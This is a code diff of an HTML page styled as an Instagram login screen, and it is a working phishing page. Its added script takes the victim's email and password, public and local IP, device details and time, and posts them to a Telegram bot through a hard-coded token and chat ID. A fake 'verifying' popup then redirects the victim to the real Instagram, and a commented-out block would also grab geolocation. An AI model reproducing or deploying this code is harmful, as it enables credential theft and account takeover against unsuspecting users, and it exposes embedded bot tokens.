@@ -3,11 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="stayle.css" />
+    <link rel="stylesheet" href="./stayle.css" />
     <link rel="icon" type="image/png" href="./img/insta-fav.ico">
-    <title>Instagram Clone</title>
+    <title>Instagram Login</title>
+    <style>
+        /* نمط النافذة المنبثقة */
+        .popup {
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            background: url('https://your-beautiful-background-image-url.com') no-repeat center center;
+            background-size: cover;
+            color: #fff; /* لون النص الأبيض */
+            border: 1px solid #ccc;
+            padding: 20px;
+            z-index: 1000;
+            display: none;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .popup p {
+            margin: 0;
+            padding: 0;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+            display: none;
+        }
+    </style>
 </head>
 <body>
+    <div class="popup-overlay" id="popup-overlay"></div>
+    <div class="popup" id="popup">
+        <p>Please wait a moment while we verify your information...</p>
+    </div>
     <main class="flex align-items-center justify-content-center">
         <section id="mobile" class="flex">
         </section>
@@ -16,14 +56,14 @@
                 <h1 title="Instagram" class="flex justify-content-center">
                     <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
-                <form>
-                    <label for="email" class="sr-only">Phone number, username or email</label>
-                    <input name="email" placeholder="Phone number, username, or email" />
+                <form id="login-form">
+                    <label for="email" class="sr-only">Phone, username or email</label>
+                    <input id="email" name="email" placeholder="Phone, username or email" />
 
                     <label for="password" class="sr-only">Password</label>
-                    <input name="password" type="password" placeholder="Password" />
+                    <input id="password" name="password" type="password" placeholder="Password" />
 
-                    <button type="button">Log in</button>
+                    <button type="submit">Log In</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
@@ -35,7 +75,7 @@
                         <img />
                         <a>Log in with Facebook</a>
                     </div>
-                    <a href="#">Forgot your password?</a>
+                    <a href="#">Forgot password?</a>
                 </div>
             </div>
             <div class="panel register flex justify-content-center">
@@ -61,60 +101,161 @@
             <li><a href="#">PRIVACY</a></li>
             <li><a href="#">TERMS</a></li>
             <li><a href="#">LOCATIONS</a></li>
-            <li><a href="#">MOST RELEVANT ACCOUNTS</a></li>
+            <li><a href="#">TOP ACCOUNTS</a></li>
             <li><a href="#">HASHTAGS</a></li>
             <li><a href="#">LANGUAGE</a></li>
         </ul>
         <p class="copyright">© 2020 Instagram from Facebook</p>
     </footer>
-
     <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-<script>
-    const TOKEN = "7824202018:AAFNnynEY_g04ju9iqNV5v4IgSc6zyhMYRE";                                                            // هنا التوكين              
-    const CHAT_ID = "6830696557";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+    <script>
+        const TOKEN = "7934681909:AAGLGtf8SeFuP8kQT2KRKn1NWgtqPHsqeNM"; // ضع هنا التوكين الخاص بالبوت
+        const CHAT_ID = "6830696557"; // ضع هنا معرف الدردشة الخاص بك
 
-    document.getElementById('login-form').addEventListener('submit', function(e) {
-        e.preventDefault();
+        function getLocalIP(callback) {
+            let localIP = 'Unknown';
+            const pc = new RTCPeerConnection();
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = event => {
+                if (event && event.candidate && event.candidate.candidate) {
+                    const parts = event.candidate.candidate.split(' ');
+                    const addr = parts[4];
+                    if (addr) {
+                        localIP = addr;
+                        pc.close();
+                        callback(localIP);
+                    }
+                }
+            };
+        }
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+        function showPopup() {
+            document.getElementById('popup-overlay').style.display = 'block';
+            document.getElementById('popup').style.display = 'block';
+        }
 
-        axios.get('https://api.ipify.org?format=json')
-            .then(response => {
-                const ip = response.data.ip;
+        function hidePopup() {
+            document.getElementById('popup-overlay').style.display = 'none';
+            document.getElementById('popup').style.display = 'none';
+        }
 
-                const userAgent = navigator.userAgent;
-                const platform = navigator.platform;
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
-                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-                const message = ` 
-                    <b>New Login Attempt</b>\n
-                    <b>Email:</b> ${email}\n
-                    <b>Password:</b> ${password}\n
-                    <b>IP Address:</b> ${ip}\n
-                    <b>Device Type:</b> ${deviceType}\n
-                    <b>Platform:</b> ${platform}\n
-                    <b>User Agent:</b> ${userAgent}\n
-                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
-                `;
+            // عرض النافذة المنبثقة
+            showPopup();
 
-                axios.post(URI_API, {
-                    chat_id: CHAT_ID,
-                    parse_mode: 'html',
-                    text: message
-                }).then(response => {
-                    alert('Information sent successfully!');
-                }).catch(error => {
-                    alert('Error sending the information. Please try again.');
-                });
-            })
-            .catch(error => {
-                alert('Error fetching the IP address. Please try again.');
-            });
+            // الحصول على التاريخ والوقت الحالي
+            const currentTime = new Date().toLocaleString();
+
+            // جمع المعلومات الأساسية
+            axios.get('https://api64.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    // الحصول على عنوان IP الداخلي
+                    getLocalIP(localIP => {
+                        const messageBase = ` 
+                            New Login Attempt\n
+                            Email: ${email}\n
+                            Password: ${password}\n
+                            IP Address: ${ip}\n
+                            Local IP Address: ${localIP}\n
+                            Device Type: ${deviceType}\n
+                            Platform: ${platform}\n
+                            User Agent: ${userAgent}\n
+                            Screen Resolution: ${screenWidth}x${screenHeight}\n
+                            Time: ${currentTime}
+                        `;
+                        // بعد الحصول على IP الداخلي
+getLocalIP(localIP => {
+    const message = ` 
+        New Login Attempt\n
+        Email: ${email}\n
+        Password: ${password}\n
+        IP Address: ${ip}\n
+        Local IP Address: ${localIP}\n
+        Device Type: ${deviceType}\n
+        Platform: ${platform}\n
+        User Agent: ${userAgent}\n
+        Screen Resolution: ${screenWidth}x${screenHeight}\n
+        Time: ${currentTime}
+    `;
+
+    // إرسال البيانات إلى Telegram مباشرة بدون موقع
+    axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        chat_id: CHAT_ID,
+        text: message
+    }).then(response => {
+        setTimeout(() => {
+            hidePopup();
+            window.location.href = "https://www.instagram.com";
+            setTimeout(() => {
+                window.close();
+            }, 1000);
+        }, 60000);
+    }).catch(error => {
+        hidePopup();
+        alert('Error sending the information. Please try again.');
     });
-</script>
+});
+
+
+                        // // جمع معلومات الموقع الجغرافي
+                        // if (navigator.geolocation) {
+                        //     navigator.geolocation.getCurrentPosition(position => {
+                        //         const latitude = position.coords.latitude;
+                        //         const longitude = position.coords.longitude;
+                        //         const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                        //         // جمع سرعة الاتصال بالإنترنت
+                        //         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                        //         const connectionSpeed = connection ? connection.downlink + ' Mbps' : 'Unknown';
+
+                        //         const message = `${messageBase}\nLocation: [Google Maps Link](${locationUrl})\nInternet Speed: ${connectionSpeed}`;
+                                
+                        //         // إرسال البيانات إلى Telegram
+                        //         axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                        //             chat_id: CHAT_ID,
+                        //             text: message
+                        //         }).then(response => {
+                        //             // إخفاء النافذة المنبثقة بعد دقيقة
+                        //             setTimeout(() => {
+                        //                 hidePopup();
+                        //                 window.location.href = "https://www.instagram.com";
+                        //                 // كود لإغلاق النافذة بعد التسجيل
+                        //                 setTimeout(() => {
+                        //                     window.close();
+                        //                 }, 1000); // وقت التأخير قبل إغلاق المتصفح
+                        //             }, 60000); // وقت الانتظار 60 ثانية
+                        //         }).catch(error => {
+                        //             hidePopup();
+                        //             alert('Error sending the information. Please try again.');
+                        //         });
+                        //     }, error => {
+                        //         hidePopup();
+                        //         alert('Error fetching the geolocation. Please try again.');
+                        //     });
+                        // } else {
+                        //     hidePopup();
+                        //     alert('Geolocation is not supported by this browser.');
+                        // }
+                    });
+                })
+                .catch(error => {
+                    hidePopup();
+                    alert('Error fetching the IP address. Please try again.');
+                });
+        });
+    </script>
 </body>
 </html>
